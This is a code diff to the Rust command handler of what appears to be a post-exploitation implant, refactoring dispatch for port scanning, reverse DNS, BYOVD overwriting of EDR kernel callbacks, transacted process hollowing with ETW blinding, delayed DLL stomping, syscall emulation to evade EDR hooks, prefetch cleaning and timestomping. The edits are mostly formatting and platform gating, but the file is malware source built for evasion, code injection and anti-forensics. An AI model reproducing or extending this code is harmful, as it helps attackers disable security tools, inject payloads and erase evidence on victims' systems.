@@ -9,7 +9,15 @@
 //! - **Loaded plugins**: Registry of dynamically loaded plugin modules.
 
 use base64::Engine;
-use common::{config::Config, AuditEvent, Command, CryptoSession, Message, NetDiscoveryOp, Outcome};
+use common::{
+    config::Config,
+    AuditEvent,
+    Command,
+    CryptoSession,
+    Message,
+    NetDiscoveryOp,
+    Outcome,
+};
 use lazy_static::lazy_static;
 use module_loader::LoadedPlugin;
 use std::collections::HashMap;
@@ -331,26 +339,28 @@ pub async fn handle_command(
                     }
                 }
                 NetDiscoveryOp::TcpPortScan { host, ports, concurrency, timeout_ms } => {
-                    let ip: IpAddr = host.parse()
-                        .map_err(|e| format!("invalid IP address '{}': {}", host, e))?;
-                    match super::net_discovery::tcp_port_scan(
-                        ip,
-                        ports,
-                        *concurrency,
-                        Duration::from_millis(*timeout_ms),
-                    ).await {
-                        Ok(open_ports) => serde_json::to_string(&open_ports)
-                            .map_err(|e| e.to_string()),
-                        Err(e) => Err(e),
+                    match host.parse::<IpAddr>() {
+                        Ok(ip) => match super::net_discovery::tcp_port_scan(
+                            ip,
+                            ports,
+                            *concurrency,
+                            Duration::from_millis(*timeout_ms),
+                        ).await {
+                            Ok(open_ports) => serde_json::to_string(&open_ports)
+                                .map_err(|e| e.to_string()),
+                            Err(e) => Err(e),
+                        },
+                        Err(e) => Err(format!("invalid IP address '{}': {}", host, e)),
                     }
                 }
                 NetDiscoveryOp::ReverseDns { ip } => {
-                    let addr: IpAddr = ip.parse()
-                        .map_err(|e| format!("invalid IP address '{}': {}", ip, e))?;
-                    match super::net_discovery::reverse_dns_lookup(addr) {
-                        Ok(hostname) => serde_json::to_string(&hostname)
-                            .map_err(|e| e.to_string()),
-                        Err(e) => Err(e),
+                    match ip.parse::<IpAddr>() {
+                        Ok(addr) => match super::net_discovery::reverse_dns_lookup(addr) {
+                            Ok(hostname) => serde_json::to_string(&hostname)
+                                .map_err(|e| e.to_string()),
+                            Err(e) => Err(e),
+                        },
+                        Err(e) => Err(format!("invalid IP address '{}': {}", ip, e)),
                     }
                 }
                 NetDiscoveryOp::AdSrvDiscovery { domain } => {
@@ -1328,7 +1338,7 @@ pub async fn handle_command(
         /// Dynamically adjust the Evanesco idle threshold.
         #[cfg(all(windows, feature = "evanesco"))]
         Command::EvanescoSetThreshold { idle_ms } => {
-            crate::page_tracker::set_idle_threshold(*idle_ms);
+            crate::page_tracker::set_idle_threshold(idle_ms);
             Ok(format!("Evanesco idle threshold set to {}ms", idle_ms))
         }
         #[cfg(not(all(windows, feature = "evanesco")))]
@@ -1338,7 +1348,7 @@ pub async fn handle_command(
 
         // ── Kernel callback overwrite (BYOVD, Windows only) ───────────
 
-        /// Discover and report all registered EDR kernel callbacks.
+        // Discover and report all registered EDR kernel callbacks.
         #[cfg(all(windows, feature = "kernel-callback"))]
         Command::KernelCallbackScan => {
             let key_bytes = crypto.key_bytes();
@@ -1352,7 +1362,7 @@ pub async fn handle_command(
             Err("kernel-callback feature not enabled".to_string())
         }
 
-        /// Deploy driver + overwrite EDR callbacks with ret.
+        // Deploy driver + overwrite EDR callbacks with ret.
         #[cfg(all(windows, feature = "kernel-callback"))]
         Command::KernelCallbackNuke { ref drivers } => {
             let key_bytes = crypto.key_bytes();
@@ -1366,7 +1376,7 @@ pub async fn handle_command(
             Err("kernel-callback feature not enabled".to_string())
         }
 
-        /// Restore original callback pointers from saved backup.
+        // Restore original callback pointers from saved backup.
         #[cfg(all(windows, feature = "kernel-callback"))]
         Command::KernelCallbackRestore => {
             let key_bytes = crypto.key_bytes();
@@ -1435,7 +1445,7 @@ pub async fn handle_command(
         }
 
         /// NTFS transaction-based process hollowing with ETW blinding.
-        #[cfg(feature = "transacted-hollowing")]
+        #[cfg(all(windows, feature = "transacted-hollowing"))]
         Command::TransactedHollow {
             ref target_process,
             ref payload,
@@ -1472,6 +1482,10 @@ pub async fn handle_command(
                 Err(e) => Err(format!("transacted hollowing failed: {e}")),
             }
         }
+        #[cfg(all(not(windows), feature = "transacted-hollowing"))]
+        Command::TransactedHollow { .. } => {
+            Err("TransactedHollow is only available on Windows".to_string())
+        }
         #[cfg(not(feature = "transacted-hollowing"))]
         Command::TransactedHollow { .. } => {
             Err("transacted-hollowing feature not enabled".to_string())
@@ -1483,7 +1497,7 @@ pub async fn handle_command(
         // heuristics pass, then overwrites the DLL's .text section with
         // the payload.  Returns immediately after Phase 1 (DLL load);
         // Phase 2 (stomp + execute) runs in a background thread.
-        #[cfg(feature = "delayed-stomp")]
+        #[cfg(all(windows, feature = "delayed-stomp"))]
         Command::DelayedStomp {
             target_pid,
             ref payload,
@@ -1518,6 +1532,10 @@ pub async fn handle_command(
                     Err(e) => Err(format!("delayed stomp failed: {e}")),
                 }
             }
+        }
+        #[cfg(all(not(windows), feature = "delayed-stomp"))]
+        Command::DelayedStomp { .. } => {
+            Err("DelayedStomp is only available on Windows".to_string())
         }
         #[cfg(not(feature = "delayed-stomp"))]
         Command::DelayedStomp { .. } => {
@@ -1668,7 +1686,7 @@ pub async fn handle_command(
         // kernel32/advapi32 equivalents instead of ntdll syscall stubs.
         #[cfg(all(windows, feature = "syscall-emulation"))]
         Command::SyscallEmulationToggle { enabled } => {
-            crate::syscall_emulation::set_emulation_enabled(*enabled);
+            crate::syscall_emulation::set_emulation_enabled(enabled);
             let status = crate::syscall_emulation::status_json();
             Ok(status)
         }
@@ -1733,7 +1751,7 @@ pub async fn handle_command(
         // All NT API calls use indirect syscalls to bypass EDR hooks.
         #[cfg(all(windows, feature = "forensic-cleanup"))]
         Command::CleanPrefetch { exe_name } => {
-            crate::forensic_cleanup::prefetch::clean_prefetch(exe_name)
+            crate::forensic_cleanup::prefetch::clean_prefetch(&exe_name)
         }
         #[cfg(not(all(windows, feature = "forensic-cleanup")))]
         Command::CleanPrefetch { .. } => {
@@ -1782,14 +1800,14 @@ pub async fn handle_command(
                 }
             };
 
-            let file_nt = to_nt_wide(file_path);
+            let file_nt = to_nt_wide(&file_path);
             if reference_file.trim().is_empty() {
                 unsafe {
                     crate::forensic_cleanup::timestamps::sync_timestamps_with_default_ref(&file_nt)
                 }
                 .map(|_| "Timestomp complete".to_string())
             } else {
-                let reference_nt = to_nt_wide(reference_file);
+                let reference_nt = to_nt_wide(&reference_file);
                 unsafe { crate::forensic_cleanup::timestamps::sync_timestamps(&file_nt, &reference_nt) }
                     .map(|_| "Timestomp complete".to_string())
             }
@@ -1815,7 +1833,7 @@ pub async fn handle_command(
                 }
             };
 
-            let dir_nt = to_nt_wide(dir_path);
+            let dir_nt = to_nt_wide(&dir_path);
             let reference = if reference_file.trim().is_empty() {
                 config.lock().await.timestamps.reference_file.clone()
             } else {
